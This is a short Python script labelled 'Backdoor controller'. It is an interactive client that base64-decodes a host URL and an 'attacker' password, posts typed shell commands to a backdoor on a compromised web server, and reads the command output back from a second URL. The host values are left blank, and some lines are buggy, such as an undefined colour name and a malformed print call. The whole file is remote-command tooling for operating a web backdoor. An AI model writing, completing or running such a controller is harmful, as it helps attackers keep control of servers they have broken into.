# Backdoor controller

import requests, sys, time, base64, platform, os


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
WHITE = '\033[97m'
FAIL = '\033[91m'
ENDC = '\033[0m'

info = '''Info Panel Soon!'''
system = platform.system()


def b64():
	output = '' # Output url encrypted in Base64
	host = '' # Host url encrypted in Base64
	pwd = 'cGFzc3dvcmQ=' # Attacker pwd encrypted in Base64
	shell(host, output, pwd)

def shell(host, output, pwd):
	oldcmd = ''
	cmd = ''
	payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
	r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
	try:
		while True:
			cmd = input(OKBLUE + "Shell" + WHITE +"> ")
			if not cmd == ':exit':
				if not cmd == oldcmd:
					if not cmd == ':info':
						payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
						r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
						#requests.post(host, data={ 'pwd':pwd, 'cmd':cls})
						if r.status_code == 200:
							time.sleep(3)
							response = requests.get(base64.b64decode(output).decode('utf-8')).text
							print('\n' + OKBLUE + response)
							oldcmd = cmd
						else:
							print(RED + "Error while getting response, Status code:". r.status_code)
					else:
						print(info)
			else:
				payload = { 'pwd':base64.b64decode(pwd).decode('utf-8') , 'cmd':cmd}
				r = requests.post(base64.b64decode(host).decode('utf-8') , data=payload)
				sys.exit()
	except KeyboardInterrupt:
		print(FAIL + "\nUser Quitted Connection")
		sys.exit()

if __name__ in "__main__":
	b64()
